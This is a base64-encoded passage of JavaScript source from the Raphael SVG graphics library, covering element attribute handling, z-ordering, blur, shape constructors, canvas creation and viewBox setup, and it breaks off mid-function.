zbCjigKLigKLigKIsIOKAouKAouKAoiwg4oCi4oCi4oCiKSDigJQgYWxtb3N0IHRoZSBzYW1lIGFzIGhzYiwgc2VlIDxhIGhyZWY9XCJodHRwOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0hTTF9hbmRfSFNWXCIgdGl0bGU9XCJIU0wgYW5kIEhTViAtIFdpa2lwZWRpYSwgdGhlIGZyZWUgZW5jeWNsb3BlZGlhXCI+V2lraXBlZGlhIHBhZ2U8L2E+PC9saT5cbiAgICAgIyAgICAgPGxpPmhzbCjigKLigKLigKIlLCDigKLigKLigKIlLCDigKLigKLigKIlKSDigJQgc2FtZSBhcyBhYm92ZSwgYnV0IGluICU8L2xpPlxuICAgICAjICAgICA8bGk+aHNsYSjigKLigKLigKIsIOKAouKAouKAoiwg4oCi4oCi4oCiLCDigKLigKLigKIpIOKAlCBzYW1lIGFzIGFib3ZlLCBidXQgd2l0aCBvcGFjaXR5PC9saT5cbiAgICAgIyAgICAgPGxpPk9wdGlvbmFsbHkgZm9yIGhzYiBhbmQgaHNsIHlvdSBjb3VsZCBzcGVjaWZ5IGh1ZSBhcyBhIGRlZ3JlZTog4oCcPGNvZGU+aHNsKDI0MGRlZywmbmJzcDsxLCZuYnNwOy41KTwvY29kZT7igJ0gb3IsIGlmIHlvdSB3YW50IHRvIGdvIGZhbmN5LCDigJw8Y29kZT5oc2woMjQwwrAsJm5ic3A7MSwmbmJzcDsuNSk8L2NvZGU+4oCdPC9saT5cbiAgICAgIyA8L3VsPlxuICAgIFxcKi9cbiAgICBlbHByb3RvLmF0dHIgPSBmdW5jdGlvbiAobmFtZSwgdmFsdWUpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKG5hbWUgPT0gbnVsbCkge1xuICAgICAgICAgICAgdmFyIHJlcyA9IHt9O1xuICAgICAgICAgICAgZm9yICh2YXIgYSBpbiB0aGlzLmF0dHJzKSBpZiAodGhpcy5hdHRyc1toYXNdKGEpKSB7XG4gICAgICAgICAgICAgICAgcmVzW2FdID0gdGhpcy5hdHRyc1thXTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlcy5ncmFkaWVudCAmJiByZXMuZmlsbCA9PSBcIm5vbmVcIiAmJiAocmVzLmZpbGwgPSByZXMuZ3JhZGllbnQpICYmIGRlbGV0ZSByZXMuZ3JhZGllbnQ7XG4gICAgICAgICAgICByZXMudHJhbnNmb3JtID0gdGhpcy5fLnRyYW5zZm9ybTtcbiAgICAgICAgICAgIHJldHVybiByZXM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHZhbHVlID09IG51bGwgJiYgUi5pcyhuYW1lLCBcInN0cmluZ1wiKSkge1xuICAgICAgICAgICAgaWYgKG5hbWUgPT0gXCJmaWxsXCIgJiYgdGhpcy5hdHRycy5maWxsID09IFwibm9uZVwiICYmIHRoaXMuYXR0cnMuZ3JhZGllbnQpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5hdHRycy5ncmFkaWVudDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChuYW1lID09IFwidHJhbnNmb3JtXCIpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5fLnRyYW5zZm9ybTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHZhciBuYW1lcyA9IG5hbWUuc3BsaXQoc2VwYXJhdG9yKSxcbiAgICAgICAgICAgICAgICBvdXQgPSB7fTtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IG5hbWVzLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICBuYW1lID0gbmFtZXNbaV07XG4gICAgICAgICAgICAgICAgaWYgKG5hbWUgaW4gdGhpcy5hdHRycykge1xuICAgICAgICAgICAgICAgICAgICBvdXRbbmFtZV0gPSB0aGlzLmF0dHJzW25hbWVdO1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoUi5pcyh0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbbmFtZV0sIFwiZnVuY3Rpb25cIikpIHtcbiAgICAgICAgICAgICAgICAgICAgb3V0W25hbWVdID0gdGhpcy5wYXBlci5jdXN0b21BdHRyaWJ1dGVzW25hbWVdLmRlZjtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBvdXRbbmFtZV0gPSBSLl9hdmFpbGFibGVBdHRyc1tuYW1lXTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gaWkgLSAxID8gb3V0IDogb3V0W25hbWVzWzBdXTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodmFsdWUgPT0gbnVsbCAmJiBSLmlzKG5hbWUsIFwiYXJyYXlcIikpIHtcbiAgICAgICAgICAgIG91dCA9IHt9O1xuICAgICAgICAgICAgZm9yIChpID0gMCwgaWkgPSBuYW1lLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICBvdXRbbmFtZVtpXV0gPSB0aGlzLmF0dHIobmFtZVtpXSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gb3V0O1xuICAgICAgICB9XG4gICAgICAgIGlmICh2YWx1ZSAhPSBudWxsKSB7XG4gICAgICAgICAgICB2YXIgcGFyYW1zID0ge307XG4gICAgICAgICAgICBwYXJhbXNbbmFtZV0gPSB2YWx1ZTtcbiAgICAgICAgfSBlbHNlIGlmIChuYW1lICE9IG51bGwgJiYgUi5pcyhuYW1lLCBcIm9iamVjdFwiKSkge1xuICAgICAgICAgICAgcGFyYW1zID0gbmFtZTtcbiAgICAgICAgfVxuICAgICAgICBmb3IgKHZhciBrZXkgaW4gcGFyYW1zKSB7XG4gICAgICAgICAgICBldmUoXCJyYXBoYWVsLmF0dHIuXCIgKyBrZXkgKyBcIi5cIiArIHRoaXMuaWQsIHRoaXMsIHBhcmFtc1trZXldKTtcbiAgICAgICAgfVxuICAgICAgICBmb3IgKGtleSBpbiB0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXMpIGlmICh0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbaGFzXShrZXkpICYmIHBhcmFtc1toYXNdKGtleSkgJiYgUi5pcyh0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNba2V5XSwgXCJmdW5jdGlvblwiKSkge1xuICAgICAgICAgICAgdmFyIHBhciA9IHRoaXMucGFwZXIuY3VzdG9tQXR0cmlidXRlc1trZXldLmFwcGx5KHRoaXMsIFtdLmNvbmNhdChwYXJhbXNba2V5XSkpO1xuICAgICAgICAgICAgdGhpcy5hdHRyc1trZXldID0gcGFyYW1zW2tleV07XG4gICAgICAgICAgICBmb3IgKHZhciBzdWJrZXkgaW4gcGFyKSBpZiAocGFyW2hhc10oc3Via2V5KSkge1xuICAgICAgICAgICAgICAgIHBhcmFtc1tzdWJrZXldID0gcGFyW3N1YmtleV07XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgc2V0RmlsbEFuZFN0cm9rZSh0aGlzLCBwYXJhbXMpO1xuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnRvRnJvbnRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIE1vdmVzIHRoZSBlbGVtZW50IHNvIGl0IGlzIHRoZSBjbG9zZXN0IHRvIHRoZSB2aWV3ZXLigJlzIGV5ZXMsIG9uIHRvcCBvZiBvdGhlciBlbGVtZW50cy5cbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnRvRnJvbnQgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQpIHtcbiAgICAgICAgICAgIHJldHVybiB0aGlzO1xuICAgICAgICB9XG4gICAgICAgIHZhciBub2RlID0gZ2V0UmVhbE5vZGUodGhpcy5ub2RlKTtcbiAgICAgICAgbm9kZS5wYXJlbnROb2RlLmFwcGVuZENoaWxkKG5vZGUpO1xuICAgICAgICB2YXIgc3ZnID0gdGhpcy5wYXBlcjtcbiAgICAgICAgc3ZnLnRvcCAhPSB0aGlzICYmIFIuX3RvZnJvbnQodGhpcywgc3ZnKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC50b0JhY2tcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIE1vdmVzIHRoZSBlbGVtZW50IHNvIGl0IGlzIHRoZSBmdXJ0aGVzdCBmcm9tIHRoZSB2aWV3ZXLigJlzIGV5ZXMsIGJlaGluZCBvdGhlciBlbGVtZW50cy5cbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnRvQmFjayA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgdmFyIG5vZGUgPSBnZXRSZWFsTm9kZSh0aGlzLm5vZGUpO1xuICAgICAgICB2YXIgcGFyZW50Tm9kZSA9IG5vZGUucGFyZW50Tm9kZTtcbiAgICAgICAgcGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUobm9kZSwgcGFyZW50Tm9kZS5maXJzdENoaWxkKTtcbiAgICAgICAgUi5fdG9iYWNrKHRoaXMsIHRoaXMucGFwZXIpO1xuICAgICAgICB2YXIgc3ZnID0gdGhpcy5wYXBlcjtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5pbnNlcnRBZnRlclxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogSW5zZXJ0cyBjdXJyZW50IG9iamVjdCBhZnRlciB0aGUgZ2l2ZW4gb25lLlxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIGVscHJvdG8uaW5zZXJ0QWZ0ZXIgPSBmdW5jdGlvbiAoZWxlbWVudCkge1xuICAgICAgICBpZiAodGhpcy5yZW1vdmVkIHx8ICFlbGVtZW50KSB7XG4gICAgICAgICAgICByZXR1cm4gdGhpcztcbiAgICAgICAgfVxuXG4gICAgICAgIHZhciBub2RlID0gZ2V0UmVhbE5vZGUodGhpcy5ub2RlKTtcbiAgICAgICAgdmFyIGFmdGVyTm9kZSA9IGdldFJlYWxOb2RlKGVsZW1lbnQubm9kZSB8fCBlbGVtZW50W2VsZW1lbnQubGVuZ3RoIC0gMV0ubm9kZSk7XG4gICAgICAgIGlmIChhZnRlck5vZGUubmV4dFNpYmxpbmcpIHtcbiAgICAgICAgICAgIGFmdGVyTm9kZS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShub2RlLCBhZnRlck5vZGUubmV4dFNpYmxpbmcpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgYWZ0ZXJOb2RlLnBhcmVudE5vZGUuYXBwZW5kQ2hpbGQobm9kZSk7XG4gICAgICAgIH1cbiAgICAgICAgUi5faW5zZXJ0YWZ0ZXIodGhpcywgZWxlbWVudCwgdGhpcy5wYXBlcik7XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuaW5zZXJ0QmVmb3JlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBJbnNlcnRzIGN1cnJlbnQgb2JqZWN0IGJlZm9yZSB0aGUgZ2l2ZW4gb25lLlxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIGVscHJvdG8uaW5zZXJ0QmVmb3JlID0gZnVuY3Rpb24gKGVsZW1lbnQpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCB8fCAhZWxlbWVudCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cblxuICAgICAgICB2YXIgbm9kZSA9IGdldFJlYWxOb2RlKHRoaXMubm9kZSk7XG4gICAgICAgIHZhciBiZWZvcmVOb2RlID0gZ2V0UmVhbE5vZGUoZWxlbWVudC5ub2RlIHx8IGVsZW1lbnRbMF0ubm9kZSk7XG4gICAgICAgIGJlZm9yZU5vZGUucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUobm9kZSwgYmVmb3JlTm9kZSk7XG4gICAgICAgIFIuX2luc2VydGJlZm9yZSh0aGlzLCBlbGVtZW50LCB0aGlzLnBhcGVyKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLmJsdXIgPSBmdW5jdGlvbiAoc2l6ZSkge1xuICAgICAgICAvLyBFeHBlcmltZW50YWwuIE5vIFNhZmFyaSBzdXBwb3J0LiBVc2UgaXQgb24geW91ciBvd24gcmlzay5cbiAgICAgICAgdmFyIHQgPSB0aGlzO1xuICAgICAgICBpZiAoK3NpemUgIT09IDApIHtcbiAgICAgICAgICAgIHZhciBmbHRyID0gJChcImZpbHRlclwiKSxcbiAgICAgICAgICAgICAgICBibHVyID0gJChcImZlR2F1c3NpYW5CbHVyXCIpO1xuICAgICAgICAgICAgdC5hdHRycy5ibHVyID0gc2l6ZTtcbiAgICAgICAgICAgIGZsdHIuaWQgPSBSLmNyZWF0ZVVVSUQoKTtcbiAgICAgICAgICAgICQoYmx1ciwge3N0ZERldmlhdGlvbjogK3NpemUgfHwgMS41fSk7XG4gICAgICAgICAgICBmbHRyLmFwcGVuZENoaWxkKGJsdXIpO1xuICAgICAgICAgICAgdC5wYXBlci5kZWZzLmFwcGVuZENoaWxkKGZsdHIpO1xuICAgICAgICAgICAgdC5fYmx1ciA9IGZsdHI7XG4gICAgICAgICAgICAkKHQubm9kZSwge2ZpbHRlcjogXCJ1cmwoI1wiICsgZmx0ci5pZCArIFwiKVwifSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpZiAodC5fYmx1cikge1xuICAgICAgICAgICAgICAgIHQuX2JsdXIucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0Ll9ibHVyKTtcbiAgICAgICAgICAgICAgICBkZWxldGUgdC5fYmx1cjtcbiAgICAgICAgICAgICAgICBkZWxldGUgdC5hdHRycy5ibHVyO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdC5ub2RlLnJlbW92ZUF0dHJpYnV0ZShcImZpbHRlclwiKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdDtcbiAgICB9O1xuICAgIFIuX2VuZ2luZS5jaXJjbGUgPSBmdW5jdGlvbiAoc3ZnLCB4LCB5LCByKSB7XG4gICAgICAgIHZhciBlbCA9ICQoXCJjaXJjbGVcIik7XG4gICAgICAgIHN2Zy5jYW52YXMgJiYgc3ZnLmNhbnZhcy5hcHBlbmRDaGlsZChlbCk7XG4gICAgICAgIHZhciByZXMgPSBuZXcgRWxlbWVudChlbCwgc3ZnKTtcbiAgICAgICAgcmVzLmF0dHJzID0ge2N4OiB4LCBjeTogeSwgcjogciwgZmlsbDogXCJub25lXCIsIHN0cm9rZTogXCIjMDAwXCJ9O1xuICAgICAgICByZXMudHlwZSA9IFwiY2lyY2xlXCI7XG4gICAgICAgICQoZWwsIHJlcy5hdHRycyk7XG4gICAgICAgIHJldHVybiByZXM7XG4gICAgfTtcbiAgICBSLl9lbmdpbmUucmVjdCA9IGZ1bmN0aW9uIChzdmcsIHgsIHksIHcsIGgsIHIpIHtcbiAgICAgICAgdmFyIGVsID0gJChcInJlY3RcIik7XG4gICAgICAgIHN2Zy5jYW52YXMgJiYgc3ZnLmNhbnZhcy5hcHBlbmRDaGlsZChlbCk7XG4gICAgICAgIHZhciByZXMgPSBuZXcgRWxlbWVudChlbCwgc3ZnKTtcbiAgICAgICAgcmVzLmF0dHJzID0ge3g6IHgsIHk6IHksIHdpZHRoOiB3LCBoZWlnaHQ6IGgsIHJ4OiByIHx8IDAsIHJ5OiByIHx8IDAsIGZpbGw6IFwibm9uZVwiLCBzdHJva2U6IFwiIzAwMFwifTtcbiAgICAgICAgcmVzLnR5cGUgPSBcInJlY3RcIjtcbiAgICAgICAgJChlbCwgcmVzLmF0dHJzKTtcbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9O1xuICAgIFIuX2VuZ2luZS5lbGxpcHNlID0gZnVuY3Rpb24gKHN2ZywgeCwgeSwgcngsIHJ5KSB7XG4gICAgICAgIHZhciBlbCA9ICQoXCJlbGxpcHNlXCIpO1xuICAgICAgICBzdmcuY2FudmFzICYmIHN2Zy5jYW52YXMuYXBwZW5kQ2hpbGQoZWwpO1xuICAgICAgICB2YXIgcmVzID0gbmV3IEVsZW1lbnQoZWwsIHN2Zyk7XG4gICAgICAgIHJlcy5hdHRycyA9IHtjeDogeCwgY3k6IHksIHJ4OiByeCwgcnk6IHJ5LCBmaWxsOiBcIm5vbmVcIiwgc3Ryb2tlOiBcIiMwMDBcIn07XG4gICAgICAgIHJlcy50eXBlID0gXCJlbGxpcHNlXCI7XG4gICAgICAgICQoZWwsIHJlcy5hdHRycyk7XG4gICAgICAgIHJldHVybiByZXM7XG4gICAgfTtcbiAgICBSLl9lbmdpbmUuaW1hZ2UgPSBmdW5jdGlvbiAoc3ZnLCBzcmMsIHgsIHksIHcsIGgpIHtcbiAgICAgICAgdmFyIGVsID0gJChcImltYWdlXCIpO1xuICAgICAgICAkKGVsLCB7eDogeCwgeTogeSwgd2lkdGg6IHcsIGhlaWdodDogaCwgcHJlc2VydmVBc3BlY3RSYXRpbzogXCJub25lXCJ9KTtcbiAgICAgICAgZWwuc2V0QXR0cmlidXRlTlMoeGxpbmssIFwiaHJlZlwiLCBzcmMpO1xuICAgICAgICBzdmcuY2FudmFzICYmIHN2Zy5jYW52YXMuYXBwZW5kQ2hpbGQoZWwpO1xuICAgICAgICB2YXIgcmVzID0gbmV3IEVsZW1lbnQoZWwsIHN2Zyk7XG4gICAgICAgIHJlcy5hdHRycyA9IHt4OiB4LCB5OiB5LCB3aWR0aDogdywgaGVpZ2h0OiBoLCBzcmM6IHNyY307XG4gICAgICAgIHJlcy50eXBlID0gXCJpbWFnZVwiO1xuICAgICAgICByZXR1cm4gcmVzO1xuICAgIH07XG4gICAgUi5fZW5naW5lLnRleHQgPSBmdW5jdGlvbiAoc3ZnLCB4LCB5LCB0ZXh0KSB7XG4gICAgICAgIHZhciBlbCA9ICQoXCJ0ZXh0XCIpO1xuICAgICAgICBzdmcuY2FudmFzICYmIHN2Zy5jYW52YXMuYXBwZW5kQ2hpbGQoZWwpO1xuICAgICAgICB2YXIgcmVzID0gbmV3IEVsZW1lbnQoZWwsIHN2Zyk7XG4gICAgICAgIHJlcy5hdHRycyA9IHtcbiAgICAgICAgICAgIHg6IHgsXG4gICAgICAgICAgICB5OiB5LFxuICAgICAgICAgICAgXCJ0ZXh0LWFuY2hvclwiOiBcIm1pZGRsZVwiLFxuICAgICAgICAgICAgdGV4dDogdGV4dCxcbiAgICAgICAgICAgIFwiZm9udC1mYW1pbHlcIjogUi5fYXZhaWxhYmxlQXR0cnNbXCJmb250LWZhbWlseVwiXSxcbiAgICAgICAgICAgIFwiZm9udC1zaXplXCI6IFIuX2F2YWlsYWJsZUF0dHJzW1wiZm9udC1zaXplXCJdLFxuICAgICAgICAgICAgc3Ryb2tlOiBcIm5vbmVcIixcbiAgICAgICAgICAgIGZpbGw6IFwiIzAwMFwiXG4gICAgICAgIH07XG4gICAgICAgIHJlcy50eXBlID0gXCJ0ZXh0XCI7XG4gICAgICAgIHNldEZpbGxBbmRTdHJva2UocmVzLCByZXMuYXR0cnMpO1xuICAgICAgICByZXR1cm4gcmVzO1xuICAgIH07XG4gICAgUi5fZW5naW5lLnNldFNpemUgPSBmdW5jdGlvbiAod2lkdGgsIGhlaWdodCkge1xuICAgICAgICB0aGlzLndpZHRoID0gd2lkdGggfHwgdGhpcy53aWR0aDtcbiAgICAgICAgdGhpcy5oZWlnaHQgPSBoZWlnaHQgfHwgdGhpcy5oZWlnaHQ7XG4gICAgICAgIHRoaXMuY2FudmFzLnNldEF0dHJpYnV0ZShcIndpZHRoXCIsIHRoaXMud2lkdGgpO1xuICAgICAgICB0aGlzLmNhbnZhcy5zZXRBdHRyaWJ1dGUoXCJoZWlnaHRcIiwgdGhpcy5oZWlnaHQpO1xuICAgICAgICBpZiAodGhpcy5fdmlld0JveCkge1xuICAgICAgICAgICAgdGhpcy5zZXRWaWV3Qm94LmFwcGx5KHRoaXMsIHRoaXMuX3ZpZXdCb3gpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgUi5fZW5naW5lLmNyZWF0ZSA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgdmFyIGNvbiA9IFIuX2dldENvbnRhaW5lci5hcHBseSgwLCBhcmd1bWVudHMpLFxuICAgICAgICAgICAgY29udGFpbmVyID0gY29uICYmIGNvbi5jb250YWluZXI7XG4gICAgICAgIGlmICghY29udGFpbmVyKSB7XG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXCJTVkcgY29udGFpbmVyIG5vdCBmb3VuZC5cIik7XG4gICAgICAgIH1cbiAgICAgICAgdmFyIHggPSBjb24ueCxcbiAgICAgICAgICAgIHkgPSBjb24ueSxcbiAgICAgICAgICAgIHdpZHRoID0gY29uLndpZHRoLFxuICAgICAgICAgICAgaGVpZ2h0ID0gY29uLmhlaWdodCxcbiAgICAgICAgICAgIGNudnMgPSAkKFwic3ZnXCIpLFxuICAgICAgICAgICAgY3NzID0gXCJvdmVyZmxvdzpoaWRkZW47XCIsXG4gICAgICAgICAgICBpc0Zsb2F0aW5nO1xuICAgICAgICB4ID0geCB8fCAwO1xuICAgICAgICB5ID0geSB8fCAwO1xuICAgICAgICB3aWR0aCA9IHdpZHRoIHx8IDUxMjtcbiAgICAgICAgaGVpZ2h0ID0gaGVpZ2h0IHx8IDM0MjtcbiAgICAgICAgJChjbnZzLCB7XG4gICAgICAgICAgICBoZWlnaHQ6IGhlaWdodCxcbiAgICAgICAgICAgIHZlcnNpb246IDEuMSxcbiAgICAgICAgICAgIHdpZHRoOiB3aWR0aCxcbiAgICAgICAgICAgIHhtbG5zOiBcImh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnXCIsXG4gICAgICAgICAgICBcInhtbG5zOnhsaW5rXCI6IFwiaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGlua1wiXG4gICAgICAgIH0pO1xuICAgICAgICBpZiAoY29udGFpbmVyID09IDEpIHtcbiAgICAgICAgICAgIGNudnMuc3R5bGUuY3NzVGV4dCA9IGNzcyArIFwicG9zaXRpb246YWJzb2x1dGU7bGVmdDpcIiArIHggKyBcInB4O3RvcDpcIiArIHkgKyBcInB4XCI7XG4gICAgICAgICAgICBSLl9nLmRvYy5ib2R5LmFwcGVuZENoaWxkKGNudnMpO1xuICAgICAgICAgICAgaXNGbG9hdGluZyA9IDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBjbnZzLnN0eWxlLmNzc1RleHQgPSBjc3MgKyBcInBvc2l0aW9uOnJlbGF0aXZlXCI7XG4gICAgICAgICAgICBpZiAoY29udGFpbmVyLmZpcnN0Q2hpbGQpIHtcbiAgICAgICAgICAgICAgICBjb250YWluZXIuaW5zZXJ0QmVmb3JlKGNudnMsIGNvbnRhaW5lci5maXJzdENoaWxkKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKGNudnMpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGNvbnRhaW5lciA9IG5ldyBSLl9QYXBlcjtcbiAgICAgICAgY29udGFpbmVyLndpZHRoID0gd2lkdGg7XG4gICAgICAgIGNvbnRhaW5lci5oZWlnaHQgPSBoZWlnaHQ7XG4gICAgICAgIGNvbnRhaW5lci5jYW52YXMgPSBjbnZzO1xuICAgICAgICBjb250YWluZXIuY2xlYXIoKTtcbiAgICAgICAgY29udGFpbmVyLl9sZWZ0ID0gY29udGFpbmVyLl90b3AgPSAwO1xuICAgICAgICBpc0Zsb2F0aW5nICYmIChjb250YWluZXIucmVuZGVyZml4ID0gZnVuY3Rpb24gKCkge30pO1xuICAgICAgICBjb250YWluZXIucmVuZGVyZml4KCk7XG4gICAgICAgIHJldHVybiBjb250YWluZXI7XG4gICAgfTtcbiAgICBSLl9lbmdpbmUuc2V0Vmlld0JveCA9IGZ1bmN0aW9uICh4LCB5LCB3LCBoLCBmaXQpIHtcbiAgICAgICAgZXZlKFwicmFwaGFlbC5zZXRWaWV3Qm94XCIsIHRoaXMsIHRoaXMuX3ZpZXdCb3gsIFt4LCB5LCB3LCBoLCBmaXRdKTtcbiAgICAgICAgdmFyIHBhcGVyU2l6ZSA9IHRoaXMuZ2V0U2l6ZSgpLFxuICAgICAgICAgICAgc2l6ZSA9IG1tYXgodyAvIHBhcGVyU2l6ZS53aWR0aCwgaCAvIHBhcGVyU2l6ZS5oZWlnaHQpLFxuICAgICAgICAgICAgdG9wID0gdGhpcy50b3AsXG4gICAgICAgICAgICBhc3BlY3RSYXRpbyA9IGZpdCA/IFwieE1pZFlNaWQgbWVldFwiIDogXCJ4TWluWU1pblwiLFxuICAgICAgICAgICAgdmIsXG4gICAgICAgICAgICBzdztcbiAgICAgICAgaWYgKHggPT0gbnVsbCkge1xuICAgICAgICAgICAgaWYgKHRoaXMuX3ZiU2l6ZSkge1xuICAgICAgICAgICAgICAgIHNpemUgPSAxO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgZGVsZXRlIHRoaXMuX3ZiU2l6ZTtcbiAgICAgICAgICAgIHZiID0gXCIwIDAgXCIgKyB0aGlzLndpZHRoICsgUyArIHRoaXMuaGVpZ2h0O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdGhpcy5fdmJTaXplID0gc2l6ZTtcbiAgICAgICAgICAgIHZiID0geCArIFMgKyB5ICsgUyArIHcgKyBTICsgaDtcbiAgICAgICAgfVxuICAgICAgICAkKHRoaXMuY2FudmFzLCB7XG4gICAgICAgICAgICB2aWV3Qm94OiB2YixcbiAgICAgICAgICAgIHByZXNlcnZlQXNwZWN0UmF0aW86IGFzcGVjdFJhdGlvXG4gICAgICAgIH0pO1xuICAgICAgICB3aGlsZSAoc2l6ZSAmJiB0b3ApIHtcbiAgICAgICAgICAgIHN3ID0gXCJzdHJva2Utd2lkdGhcIiBpbiB0b3AuYXR0cnMgPyB0b3AuYXR0cnNbXCJzdHJva2Utd2lkdGhcIl0gOiAxO1xuICAgICAgICAgICAgdG9wLmF0dHIoe1wic3Ryb2tlLXdpZHRoXCI6IHN3fSk7XG4gICAgICAgICAgICB0b3AuXy5kaXJ0eSA9IDE7XG4gICAgICAgICAgICB0b3AuXy5kaXJ0eVQgPSAxO1xuICAgICAgICAgICAgdG9wID0gdG9wLnByZXY7XG4gICAgICAgIH1cbiAgICAgICAgdGhpcy5fdmlld0JveCA9IFt4LCB5LCB3LCBoLCAhIWZpdF07XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLnJlbmRlcmZpeFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogRml4ZXMgdGhlIGlzc3VlIG9mIEZpcmVmb3ggYW5kIElFOSByZWdhcmRpbmcgc3VicGl4ZWwgcmVuZGVyaW5nLiBJZiBwYXBlciBpcyBkZXBlbmRlbnRcbiAgICAgKiBvbiBvdGhlciBlbGVtZW50cyBhZnRlciByZWZsb3cgaXQgY291bGQgc2hpZnQgaGFsZiBwaXhlbCB3aGljaCBjYXVzZSBmb3IgbGluZXMgdG8gbG9zdCB0aGVpciBjcmlzcG5lc3MuXG4gICAgICogVGhpcyBtZXRob2QgZml4ZXMgdGhlIGlzc3VlLlxuICAgICAqKlxuICAgICAgIFNwZWNpYWwgdGhhbmtzIHRvIE1hcml1c3ogTm93YWsgKGh0dHA6Ly93d3cubWVkaWtvby5jb20vKSBmb3IgdGhpcyBtZXRob2QuXG4gICAgXFwqL1xuICAgIFIucHJvdG90eXBlLnJlbmRlcmZpeCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgdmFyIGNudnMgPSB0aGlzLmNhbnZhcyxcbiAgICAgICAgICAgIHMgPSBjbnZzLnN0eWxlLFxuICAgICAgICAgICAgcG9zO1xuICAgICAgICB0cnkge1xuICAgICAgICAgICAgcG9zID0gY252cy5nZXRTY3JlZW5DVE0oKSB8fCBjbnZzLmNyZWF0ZVNWR01hdHJpeCgpO1xuICAgICAgICB9IGNhdGNoIChlKSB7XG4gICAgICAgICAgICBwb3MgPSBjbnZzLmNyZWF0ZVNWR01hdHJpeCgpO1xuICAgICAgICB9XG4gICAgICAgIHZhciBsZWZ0ID0gLXBvcy5lICUgMSxcbiAgICAgICAgICAgIHRvcCA9IC1wb3MuZiAlIDE7XG4gICAgICAgIGlmIChsZWZ0IHx8IHRvcCkge1xuICAgICAgICAgICAgaWYgKGxlZnQpIHtcbiAgICAgICAgICAgICAgICB0aGlzLl9sZWZ0ID0gKHRoaXMuX2xlZnQgKyBsZWZ0KSAlIDE7XG4gICAgICAgICAgICAgICAgcy5sZWZ0